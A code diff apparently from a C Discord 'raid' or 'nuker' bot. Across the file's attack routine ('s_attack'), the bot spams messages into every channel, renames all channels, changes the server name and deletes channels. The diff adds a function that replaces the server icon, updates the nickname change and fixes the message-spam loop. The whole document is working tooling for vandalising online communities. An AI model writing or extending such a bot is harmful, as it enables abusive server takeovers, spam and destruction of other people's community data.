@@ -10,7 +10,6 @@
 
 u64_snowflake_t get_guild(struct discord *client)
 {
-    // get guilds bot is a part of
     struct discord_guild **guilds = NULL;
     discord_get_current_user_guilds(client, &guilds);
     // assert(NULL != guilds && "Couldn't fetch guilds");
@@ -150,15 +149,15 @@ void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
     log_info("Renamed %d channels in % --> \"%s\"" PRIu64, i + 1, guild_id, channel_name);
 }
 
-void change_nickname(struct discord *client, u64_snowflake_t guild_id, u64_snowflake_t user_id,
+void change_nickname(struct discord *client, u64_snowflake_t guild_id,
                      char _nickname[30])
 {
-    discord_modify_guild_member(
+    char *nickname = strtok(_nickname, "");
+    discord_modify_current_member(
         client,
         guild_id,
-        user_id,
         &(struct discord_modify_guild_member_params){
-            .nick = _nickname},
+            .nick = nickname},
         NULL);
 }
 
@@ -171,7 +170,7 @@ void spam_messages(struct discord *client, u64_snowflake_t guild_id,
     discord_get_guild_channels(client, guild_id, &channels);
 
     int i = 0;
-    for (int x = 0; x <= amount; x++)
+    for (int x = 0; x < amount; x++)
     {
         while (channels[i])
         {
@@ -184,7 +183,20 @@ void spam_messages(struct discord *client, u64_snowflake_t guild_id,
             i++;
         }
     }
-    log_info("Sent %d messages in %" PRIu64, amount*i, guild_id);
+    log_info("Sent %d messages in %" PRIu64, amount * i, guild_id);
+}
+
+void change_icon(struct discord *client, u64_snowflake_t guild_id,
+                 char _icon[300])
+{
+    char *icon = strtok(_icon, "");
+
+    discord_modify_guild(
+        client,
+        guild_id,
+        &(struct discord_modify_guild_params){
+            .icon = icon},
+        NULL);
 }
 
 void on_ready(struct discord *client)
@@ -216,12 +228,17 @@ void on_ready(struct discord *client)
 
     if (s_attack.nickname_enabled == true)
     {
-        change_nickname(client, guild_id, bot->id, s_attack.nickname_name);
+        change_nickname(client, guild_id, s_attack.nickname_name);
     }
 
     if (s_attack.guild_name_enabled == true)
     {
         guild_name(client, guild_id, s_attack.guild_name);
+    }
+
+    if (s_attack.change_icon_enabled == true)
+    {
+        change_icon(client, guild_id, s_attack.change_icon_path);
     }
 
     if (s_attack.channel_delete_all == true)
